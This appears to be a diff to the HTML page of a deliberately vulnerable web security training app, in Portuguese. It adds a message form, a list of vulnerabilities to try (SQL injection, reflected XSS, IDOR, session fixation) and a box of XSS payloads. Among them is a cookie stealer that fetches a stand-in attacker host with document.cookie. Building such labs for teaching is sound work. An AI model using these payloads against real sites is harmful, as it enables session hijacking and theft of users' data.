@@ -20,18 +20,34 @@
         
         <div class="messages-content">
             <div class="messages-list">
-                <h3>📬 Mensagens Recebidas</h3>
+                <h3>📬 Suas Mensagens</h3>
                 <div id="messages-container">
                     <p>Carregando mensagens...</p>
                 </div>
             </div>
             
+            <div class="create-message-form">
+                <h3>📝 Criar Nova Mensagem</h3>
+                <form action="/create-message" method="POST">
+                    <div class="form-group">
+                        <label for="title">Título:</label>
+                        <input type="text" id="title" name="title" placeholder="Digite o título da mensagem">
+                    </div>
+                    <div class="form-group">
+                        <label for="content">Conteúdo:</label>
+                        <textarea id="content" name="content" rows="4" placeholder="Digite o conteúdo da mensagem"></textarea>
+                    </div>
+                    <button type="submit" class="submit-btn">✉️ Enviar Mensagem</button>
+                </form>
+            </div>
+            
             <div class="vulnerability-info">
                 <h3>🔍 Vulnerabilidades para Testar</h3>
                 <ul>
+                    <li><strong>SQL Injection:</strong> Tente injetar SQL no formulário de mensagem</li>
+                    <li><strong>XSS Reflected:</strong> Use a página de busca para testar XSS</li>
                     <li><strong>IDOR:</strong> Tente modificar parâmetros de ID na URL</li>
                     <li><strong>Session Fixation:</strong> Analise como as sessões são gerenciadas</li>
-                    <li><strong>XSS:</strong> Teste injeção de scripts nas mensagens</li>
                 </ul>
                 
                 <div class="test-section">
@@ -40,7 +56,16 @@
                     <ul>
                         <li><a href="/api/messages?user_id=1" target="_blank">Mensagens do Admin (IDOR)</a></li>
                         <li><a href="/debug" target="_blank">Informações de Debug</a></li>
+                        <li><a href="/view-message" target="_blank">Busca de Mensagens (XSS Reflected)</a></li>
+                        <li><a href="/xss-examples" target="_blank">📚 Exemplos e Documentação XSS</a></li>
                     </ul>
+                    
+                    <h4>💣 Payloads de XSS para testar:</h4>
+                    <div class="payload-examples">
+                        <p><strong>Título/Conteúdo:</strong> <code>&lt;script&gt;alert('XSS!')&lt;/script&gt;</code></p>
+                        <p><strong>Busca:</strong> <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code></p>
+                        <p><strong>Cookie Stealer:</strong> <code>&lt;script&gt;fetch('http://atacante.com/steal?c='+document.cookie)&lt;/script&gt;</code></p>
+                    </div>
                 </div>
             </div>
         </div>
